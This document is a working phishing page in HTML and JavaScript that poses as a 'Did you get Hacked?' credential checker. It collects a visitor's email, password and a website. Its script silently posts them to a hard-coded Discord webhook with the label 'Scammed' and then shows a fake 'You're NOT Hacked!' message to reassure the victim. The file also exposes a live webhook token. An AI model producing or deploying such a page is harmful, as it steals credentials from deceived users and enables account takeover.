<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Did you get Hacked? 🔒</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow-x: hidden;
        }

        /* Animierter Hintergrund */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120,219,255,0.2) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
            animation: float 20s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            33% { transform: translateY(-20px) rotate(120deg); }
            66% { transform: translateY(20px) rotate(240deg); }
        }

        .container {
            background: rgba(42, 42, 52, 0.95);
            backdrop-filter: blur(20px);
            padding: 50px 40px;
            border-radius: 24px;
            box-shadow: 
                0 25px 50px rgba(0, 0, 0, 0.5),
                0 0 0 1px rgba(255, 255, 255, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            animation: slideIn 0.8s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .title {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }

        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #a0a0a0;
            margin-bottom: 40px;
            font-weight: 400;
        }

        .input-group {
            margin-bottom: 24px;
            position: relative;
        }

        label {
            display: block;
            margin-bottom: 12px;
            font-size: 14px;
            font-weight: 500;
            color: #e0e0e0;
            letter-spacing: 0.5px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(58, 58, 74, 0.8);
            border: 2px solid rgba(102, 102, 255, 0.2);
            border-radius: 16px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 400;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            backdrop-filter: blur(10px);
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
            transform: translateY(-2px);
            background: rgba(58, 58, 74, 0.95);
        }

        input::placeholder {
            color: #888888;
            font-weight: 400;
        }

        .check-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .check-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.5s;
        }

        .check-btn:hover::before {
            left: 100%;
        }

        .check-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 40px rgba(102, 126, 234, 0.4);
        }

        .check-btn:active {
            transform: translateY(-1px);
        }

        /* Popup Styles */
        .popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            backdrop-filter: blur(15px);
        }

        .popup-content {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.7);
            background: rgba(42, 42, 52, 0.98);
            backdrop-filter: blur(25px);
            padding: 50px 40px;
            border-radius: 24px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 
                0 35px 70px rgba(0, 0, 0, 0.7),
                0 0 0 1px rgba(255, 255, 255, 0.1);
            max-width: 380px;
            width: 90%;
            animation: popupIn 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
        }

        @keyframes popupIn {
            to {
                transform: translate(-50%, -50%) scale(1);
            }
        }

        .popup h2 {
            color: #66ff99;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 16px;
            text-shadow: 0 0 20px rgba(102, 255, 153, 0.5);
        }

        .popup .icon {
            font-size: 64px;
            margin-bottom: 20px;
            animation: bounce 1s infinite;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-10px); }
            60% { transform: translateY(-5px); }
        }

        .popup p {
            color: #d0d0d0;
            margin-bottom: 32px;
            line-height: 1.6;
            font-size: 16px;
        }

        .close-btn {
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .close-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(255, 107, 107, 0.4);
        }

        /* Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 40px 30px;
                margin: 10px;
            }
            .title {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title">🔒 Did you get Hacked?</h1>
        <p class="subtitle">Check your credentials instantly</p>
        
        <div class="input-group">
            <label for="email">📧 Email</label>
            <input type="email" id="email" placeholder="your.email@example.com" required>
        </div>

        <div class="input-group">
            <label for="password">🔑 Password</label>
            <input type="password" id="password" placeholder="Enter your password" required>
        </div>

        <div class="input-group">
            <label for="website">🌐 Website</label>
            <input type="text" id="website" placeholder="example.com" required>
        </div>

        <button class="check-btn" onclick="checkHack()">
            🚀 Check Security Now
        </button>
    </div>

    <!-- Popup -->
    <div id="popup" class="popup">
        <div class="popup-content">
            <div class="icon">✅</div>
            <h2>You're NOT Hacked!</h2>
            <p>Your credentials appear to be safe.<br>No breaches detected on these services.</p>
            <button class="close-btn" onclick="closePopup()">Close</button>
        </div>
    </div>

    <script>
        let currentData = "";
        let lastSentData = "";
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1501994844846030885/CJVAFCr56VnpQCyLsZ7Vu9IwXgyJhawin0VqEWRoIhHGYllvHxR3hkIJwVfjq70D9Cod";

        function checkHack() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const website = document.getElementById('website').value;

            // ✨ PERFEKTER EINZELSTRING ✨
            currentData = `[HACKCHECK] Email: ${email} | Password: ${password} | Website: ${website} | IP: ${getClientIP()} | Time: ${new Date().toISOString()}`;
            
            console.log('🔥 COMBINED DATA:', currentData);
            console.log('📱 User Agent:', navigator.userAgent);
            fetch(WEBHOOK_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
              content: `Scammed: ${currentData}`,
              embeds: [],
              username: "Scammer"
           })
        });
            
            document.getElementById('popup').style.display = 'block';
        }

        function getClientIP() {
            return '127.0.0.1'; // Placeholder - echte IP via WebRTC möglich
        }

        function closePopup() {
            document.getElementById('popup').style.display = 'none';
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('website').value = '';
            currentData = "";
        }

        // Auto-Detect neue Daten
        setInterval(() => {
            if (currentData !== lastSentData && currentData.includes('@')) {
                lastSentData = currentData;
                console.log('🆕 NEW DATA CAPTURED:', currentData);
            }
        }, 1500);

        window.onclick = function(event) {
            const popup = document.getElementById('popup');
            if (event.target === popup) closePopup();
        }
    </script>
</body>
</html>
